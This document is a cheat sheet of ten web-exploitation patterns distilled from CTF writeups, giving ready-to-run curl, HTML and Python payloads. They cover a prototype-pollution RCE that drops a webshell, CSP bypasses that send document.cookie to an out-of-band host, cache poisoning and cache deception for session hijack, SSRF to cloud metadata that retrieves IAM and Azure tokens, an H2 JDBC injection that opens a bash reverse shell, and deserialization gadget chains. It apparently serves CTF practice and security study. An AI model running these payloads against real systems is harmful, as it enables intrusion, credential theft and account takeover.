# Writeup-Distilled Patterns W49–W58 — PP / CSP / cache / SSRF / deser (R2)

## W49 — Prototype-pollution via `merge` + `fork` NODE_OPTIONS RCE
Signals: Node `/config` + `merge()` filtering `__proto__` but not `constructor.prototype`; `/process` calls `fork()`; Node 16 + `node-dev` hot-reload.
Steps: 1) `POST /config {"constructor":{"prototype":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"A":"require(...execSync... )//"}}}}`; 2) `POST /process` triggers fork → env-RCE; 3) no-egress fallback: `echo <b64-webshell>|base64 -d > /app/index.js`, then `GET /webshell?cmd=cat+/flag*`.
```bash
curl -sS -X POST $URL/config -H 'Content-Type: application/json' -d '{"constructor":{"prototype":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"A":"require(\"child_process\").execSync(\"echo SFRUUC8+|base64 -d > /app/index.js\")//"}}}}'
curl -sS -X POST $URL/process
curl -sS "$URL/webshell?cmd=cat%20/flag*"
```
Pitfalls: trailing `//` comment required (env-concat quirk); direct reverse-shell fails no-egress — use file-write first.
Sources: https://newstar.wiki/wp/2024/week4/web/ezpollute.html | https://blog.alvinpanerio.com/writeups/merger-node.js-prototype-pollution | https://siunam321.github.io/ctf/portswigger-labs/Prototype-Pollution/prototype-1/

## W50 — CSP redirect-path confusion + Angular gadget
Signals: `script-src 'self' 'nonce-<rand>' 'unsafe-eval' https://cdnjs.cloudflare.com/.../jquery.min.js`; `/redirect?url=` open redirect; `DOMPurify` before base64-store.
Steps: 1) Unicode-overflow smuggle `ļ`→`<`, `ľ`→`>` past DOMPurify; 2) `<script src="/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js">` — path ignored after redirect, host-only match; 3) `<div data-ng-app>{{constructor.constructor('fetch($OOB)')()}}</div>`.
```html
ļscript src="http://$HOST/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js" ľ  ļ/script ľ
<div data-ng-app>{{constructor.constructor('fetch("https://$OOB/"+document.cookie)')()}}</div>
```
Pitfalls: `data-*` only survive DOMPurify — use `data-ng-app`, not `ng-app`; wrong Angular version = no gadget — try 1.6.0/1.0.1.
Sources: https://adamzvara.github.io/writeups/writeups/2025/BITSCTF/Get-Into-My-Cute-Small-Planner.html | https://infosecwriteups.com/compress-a-thon-web-exploitation-pentathon-2025-fea9adf9fa6b | https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-1/

## W51 — CSP bypass via JSONP `callback` gadget
Signals: `script-src 'self'` (no nonce), `style-src 'self' 'unsafe-inline'`; `/api/render` → `preview.js` `innerHTML` injects `data.html`; `/api/jsonp?callback=` reflects unvalidated.
Steps: 1) post `<script src="/api/jsonp?callback=alert();//"></script>` — same-origin, passes `self`; 2) escalate to `(function(){fetch('https://$OOB?c='+document.cookie)})()//`; 3) Report-to-moderator for bot trigger.
```html
<script src="/api/jsonp?callback=(function(){fetch('https://$OOB?c='+document.cookie)})()//"></script>
```
Pitfalls: inline `onerror` dies on `self` — must use `src`; `connect-src *` needed for exfil — check header first.
Sources: https://40rbidd3n.medium.com/intigriti-challenge-0226-stored-xss-csp-bypass-a8d65a55631f | https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-2/ | https://siunam321.github.io/ctf/portswigger-labs/Access-Control/ac-1/

## W52 — CSP-less API response + `meta-refresh` hop
Signals: dashboard CSP `script-src $HOST/static/dashboard.js` but `/api/notes/<id>` returns custom `HTTP/1.1 200 OK` with NO CSP; `dashboard.js` does `showNoteDiv.innerHTML = note`.
Steps: 1) create payload note `<html><script>fetch('/api/notes').then(...oastify...)</script>`; 2) create redirector note `<meta http-equiv="refresh" content="0; url=/api/notes/<payload-id>">`; 3) report redirector — bot hops dashboard → no-CSP payload.
```html
<meta http-equiv="refresh" content="0; url=/api/notes/<payload-id>">
```
Pitfalls: `img-src 'none'` blocks image exfil — use `fetch`; bot closes after 2s — set refresh `0`, not `1`.
Sources: https://maajix.github.io/ctfs/crewctf-2025/ | https://threalwinky.github.io/post/crewctf2025/ | https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-3/

## W53 — Cache-poison via smuggled request (JS cache loop)
Signals: `X-Cache: HIT/MISS`, `Age:`, `CF-Cache-Status`; CL.TE possible; JS asset `max-age 30`.
Steps: 1) confirm HIT with buster pair (`?cb=r1` MISS, repeat HIT); 2) smuggle `GET /post?xss` with `User-Agent: <script>` via CL.TE so cache stores poisoned JS; 3) victim `GET /` serves poisoned JS within TTL.
```bash
curl -sS "$URL/?cb=$R1" -D - | grep -iE 'x-cache|age'
curl -sS "$URL/" -H 'X-Forwarded-Host: evil<cid>' | grep -o 'evil<cid>'
```
Pitfalls: `Cache-Control: no-store` kills it — check first; destructive poison on shared infra — use benign `POISON<cid>` first.
Sources: https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Poisoning/cache-1/ | https://siunam321.github.io/ctf/portswigger-labs/HTTP-Request-Smuggling/smuggling-11/ | https://herish.me/blog/0cl-request-smuggling/

## W54 — Web-cache deception (WCD) + auth-cache leak
Signals: `/static/...` or `/imgs` cached regardless of auth; `missioninfo/<name>` expands to `/api/missioninfo/imgs..`; `Set-Cookie` cache line commented out.
Steps: 1) create resource `name=imgs<RAND>`; 2) `GET /api/missioninfo/imgs<RAND>` primes cache with your session JSON; 3) checker/bot fetch hits poisoned entry → session hijack; 4) verify `Age` growth, note TTL.
```bash
curl -sS -X POST $URL/api/create -d '{"name":"imgsABC123","short":"x"}'
curl -sS "$URL/api/missioninfo/imgsABC123" -D - | grep -iE 'age|x-cache'
```
Pitfalls: only GET/HEAD cached — POST priming fails; `Host` in `vcl_hash` — pin it.
Sources: https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Deception/WCD-1/ | https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Poisoning/cache-10/ | https://siunam321.github.io/ctf/portswigger-labs/Access-Control/ac-2/

## W55 — SSRF IMDSv2 via `instance-data` alias + PUT handshake
Signals: `/internal/webhook?url=` blocks `169.254.169.254` + decimal/hex IP tricks (DNS-resolved blocklist); accepts GET/POST/PUT + forwards headers; hint `instance has a name`.
Steps: 1) `POST /internal/webhook?url=http://instance-data/latest/meta-data/...` (legacy EC2 alias bypasses IP check, 401 = IMDSv2); 2) `PUT .../latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds: 21600` → token; 3) `GET creds` + token header → temp keys; 4) presign S3 + replay via SSRF for VPC-gated `GetObject`.
```bash
curl -sS -X PUT "$URL/internal/webhook?url=http://instance-data/latest/api/token" -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
curl -sS -G "$URL/internal/webhook" --data-urlencode 'url=http://instance-data/latest/meta-data/iam/security-credentials/' -H "X-aws-ec2-metadata-token: $TOKEN"
```
Pitfalls: IMDSv1 `GET` alone 401s — must do PUT-token first; `X-Forwarded-For` kills IMDSv2 — strip it.
Sources: https://exploitnotes.hashnode.dev/fam-ctf-the-cloud-writeup | https://medium.com/@0xn7s/qu3stc0n-ctf-challenge-web-whoiam-587f488f6079 | https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md

## W56 — SSRF via SNI / multiline-header to IMDS
Signals: Copilot/AI-studio `HttpRequestAction` with header control; direct `169.254.169.254` blocked, decimal-IP blocked; `Metadata: true` required, `X-Forwarded-For` auto-added kills Azure IMDS.
Steps: 1) point action at attacker server returning `301` to `http://169.254.169.254/...` (redirect bypasses pre-check); 2) header `Metadata: true\n\n\n` (multiline pushes auto `X-Forwarded-For` into body); 3) fetch `metadata/identity/oauth2/token` → CosmosDB keys.
```http
GET /redirect?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
Metadata: true


```
Pitfalls: SNI proxy must be 1-hop from IMDS (TTL=1) — container-bridge fails; token bound to instance — replay elsewhere fails.
Sources: https://www.tenable.com/blog/ssrfing-the-web-with-the-help-of-copilot-studio | https://allbsides.com/talk/VukL-HVBw0c.html | https://lazyhackers.in/article/htb-fortress-aws

## W57 — Jersey `;.` auth-bypass + H2 JDBC backslash RCE
Signals: Java Jersey `AuthenticationFilter` with `WHITELIST=["","test","login","register"]` + `isBaseFile=!contains("/")&&contains(".")`; `jdbcUrl=...;FORBID_CREATION=TRUE`; JDK 17 (no Nashorn).
Steps: 1) `/api/testConnect;.` bypasses filter (contains `.`, no `/` after `;` split); 2) `jdbcUrl=jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INI\T=CREATE ALIAS EXEC AS 'void cmd(String c)throws Exception{Runtime.getRuntime().exec(c);}';CALL EXEC('bash -c {echo,BASE64}|{base64,-d}|{bash,-i}')` — backslash survives parser; 3) single `404.jsp` writeback for no-egress.
```bash
curl -sS "$URL/api/testConnect;.<b64>" -H 'Authorization: Bearer x'
```
Pitfalls: `/` in path re-enables auth — use `;.` suffix, not `/`; `INI\T` case matters — backslash escapes nothing for H2 but breaks naive filter.
Sources: https://c1oudfl0w0.github.io/blog/2025/06/21/DASCTF-2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/ | https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-1/ | https://worty.fr/post/writeups/midnightflag2025/javanote/

## W58 — Fury/MapProxy二次 deser → native gadget
Signals: Python `fury.deserialize` + `com.github.ifeilong` + `hutool`; `disallowed.txt` blocks known gadgets; `MapProxy#invoke → Convert#convert → ObjectUtil#deserialize` (null allowlist).
Steps: 1) `PriorityQueue(PropertyComparator)` → `MapProxy.invoke` →二次 `readObj`; 2) inner `TemplatesImpl#getOutputProperties` via `PropertyUtil#getProperty`; 3) Fury-serialize outer, native-deserialize inner.
```python
payload = Fury(PriorityQueue(compare=PropertyComparator(prop='outputProperties'), items=[TemplatesImpl(bash_b64)]))
requests.post(URL, data=Fury.serialize(payload))
```
Pitfalls: proxy method name `hashCode/toString` skips trigger — use `getDigester`-like; outer allowlist still checks — use `PriorityQueue`, not blocked gadget.
Sources: https://www.ctfiot.com/229693.html | https://su-team.cn/post/rctf-2024-su-wu/ | https://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/
